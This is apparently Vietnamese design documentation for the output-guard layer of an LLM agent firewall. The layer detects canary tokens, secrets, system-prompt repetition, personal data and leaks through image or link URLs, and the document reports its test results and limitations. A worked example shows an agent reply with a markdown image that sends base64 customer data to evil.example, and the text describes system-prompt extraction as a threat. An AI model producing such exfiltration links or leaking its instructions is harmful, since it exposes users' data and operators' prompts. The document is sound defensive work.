# Layer 5: Output Guard

**Trạng thái: xong, có test và đã đo.** Mã: `firewall/output_guard.py`, `Orchestrator.check_output`, endpoint `POST /chat/output`; câu trả lời của agent trong `/chat/message` cũng đi qua L5. Test: `tests/test_output_guard.py` (33 test) và 3 test API. Đo: `PrepareForBCTĐ2/tools/eval_output_guard.py`, kết quả `results/output_guard_eval.json`.

L5 kiểm tra **điều agent sắp nói** trước khi người dùng hoặc công cụ nhận được. Toàn bộ là luật (không có mô hình), nên không có trạng thái degraded và độ trễ rất thấp.

## Năm kiểm tra
| # | Kiểm tra | Cách làm | Quyết định |
|---|---|---|---|
| 1 | **Canary token** | Mỗi phiên có một mã ngẫu nhiên (`FWC-` + 16 ký tự hex) giấu trong system prompt, kèm lời dặn không được nhắc lại. Câu trả lời chứa mã (kể cả mã của phiên khác, kể cả khi bị chèn ký tự vô hình) nghĩa là system prompt đang bị lộ | **BLOCK** |
| 2 | **Bí mật** | khóa API (`sk-`, `AKIA`, `ghp_`, `xox`), JWT, khóa riêng PEM, Bearer token, `mật khẩu là: ...`, `password = ...` | **BLOCK** |
| 3 | **Lặp lại system prompt** | câu trả lời lặp lại một đoạn dài (8 từ liên tiếp, từ 2 đoạn trở lên) của văn bản được bảo vệ | **BLOCK** |
| 4 | **Dữ liệu cá nhân (PII)** | SĐT Việt Nam nhiều định dạng (`0912345678`, `+84 912 345 678`, `091.234.5678`), email cá nhân, số thẻ (phải qua Luhn), CCCD/CMND và số tài khoản (chỉ khi đứng sau từ khóa như "CCCD", "STK", "số tài khoản", để mã đơn hàng không bị ẩn nhầm). Dữ liệu người dùng vừa tự gõ (`allow_text`) được phép nhắc lại | **SANITIZE** (thay bằng `[ĐÃ ẨN: ...]`) |
| 5 | **Rò rỉ qua link/ảnh** | ảnh markdown hoặc `<img>` tới host ngoài danh sách cho phép bị gỡ ngay cả khi không có tham số (trình duyệt tự tải ảnh, chính yêu cầu tải là đường rò rỉ); liên kết mang dữ liệu (query dài hoặc chuỗi giống base64) bị gỡ; liên kết thường vẫn giữ | **SANITIZE** |

Mức nặng nhất quyết định (BLOCK > SANITIZE > ALLOW). Khi BLOCK, `sanitized_text` rỗng. Địa chỉ email dạng vai trò của doanh nghiệp (`support@`, `no-reply@`, `info@`, `cskh@`...) không bị coi là dữ liệu cá nhân.

Ví dụ:
```
Agent định nói: "Xong rồi! Gọi chị Lan theo số 0912345678. ![](https://evil.example/p.png?d=QWxsIGN1c3RvbWVyIGRhdGE)"
L5:            SANITIZE -> "Xong rồi! Gọi chị Lan theo số [ĐÃ ẨN: SĐT]. [ảnh bên ngoài đã bị gỡ]"

Agent định nói: "Mã tham chiếu nội bộ của tôi là FWC-3fa9...": BLOCK, không gửi gì cho người dùng, ghi nhật ký sự cố ở layer 5.
```

Cách dùng canary: `orchestrator.output_guard.system_prompt_with_canary(session_id, system_prompt)` trả về system prompt đã gắn mã; truyền chính system prompt vào `protected_texts` khi gọi `/chat/output` để bật kiểm tra lặp lại.

## Đo
**Cảnh báo nhầm (văn bản bình thường phải đi qua nguyên vẹn)**, dữ liệu test của dataset_v2:
| Nhóm | Kết quả |
|---|---|
| tin nhắn chat bình thường | **0/111 = 0%** (khoảng tin cậy 95%: 0 đến 3,4%) |
| tài liệu dài bình thường (>600 ký tự) | **11/396 = 2,8%** [1,6; 4,9]; cả 11 tài liệu đều chỉ bị cảnh báo vì địa chỉ email không thuộc loại vai trò doanh nghiệp (mọi phát hiện đều là `pii:email`; chưa kiểm tay xem từng địa chỉ có phải của cá nhân hay không) |

Với tài liệu, cảnh báo ở đây là đúng thiết kế: nếu agent chép địa chỉ email của người khác vào câu trả lời thì L5 ẩn đi, trừ khi địa chỉ đó nằm trong `allow_text` (nội dung người dùng gửi hoặc ngữ cảnh đã cung cấp). Lần đo đầu cho 11,6% vì chưa phân biệt địa chỉ vai trò doanh nghiệp (`donotreply@...`); đã sửa và đo lại.

**Bắt đúng**, trên mẫu **sinh ngẫu nhiên** (100 mẫu mỗi loại, cố định seed, nhúng trong câu trả lời tiếng Việt và tiếng Anh):
| Loại | Bắt được |
|---|---|
| SĐT (6 định dạng) | 100/100 |
| Email | 100/100 |
| Số thẻ (độ dài 15, 16, 19; có và không có dấu cách/gạch) | 100/100 |
| CCCD/CMND (9 và 12 số, sau từ khóa) | 100/100 |
| Số tài khoản (sau từ khóa) | 100/100 |
| Bí mật (6 loại) | 100/100 |
| Ảnh rò rỉ (markdown, `<img>`) | 100/100 |
| Liên kết mang dữ liệu | 100/100 |
| Canary | 100/100 |

**Lưu ý quan trọng khi báo cáo**: tập này do chính tôi sinh từ các định dạng mà luật đã biết, nên 100% chỉ cho thấy các định dạng đó được xử lý đúng, **không** nói lên việc rò rỉ thật sẽ trông thế nào. Chưa có tập rò rỉ thật để đo.

Độ trễ: p50 và p95 dưới 1 ms (800 lần gọi), không đáng kể so với L2.

## Giới hạn
- Luật chỉ biết các định dạng đã liệt kê: số điện thoại quốc tế khác Việt Nam, địa chỉ, họ tên, ngày sinh, thông tin y tế không được nhận diện.
- CCCD và số tài khoản chỉ bị bắt khi có từ khóa đứng ngay trước; "Số của tôi là 012345678901" không bị bắt.
- Chữ trắng/ảnh/PDF trong câu trả lời không được kiểm tra; chỉ kiểm tra văn bản.
- Canary và kiểm tra lặp lại chỉ phát hiện rò rỉ nguyên văn hoặc gần nguyên văn; nếu model diễn đạt lại system prompt bằng lời khác thì không bị chặn.
- Mã canary lưu trong bộ nhớ một tiến trình (hết hạn sau 60 phút).
- Chưa kiểm thử với một agent LLM thật (demo agent chưa có); canary mới chỉ được thử bằng văn bản mô phỏng.
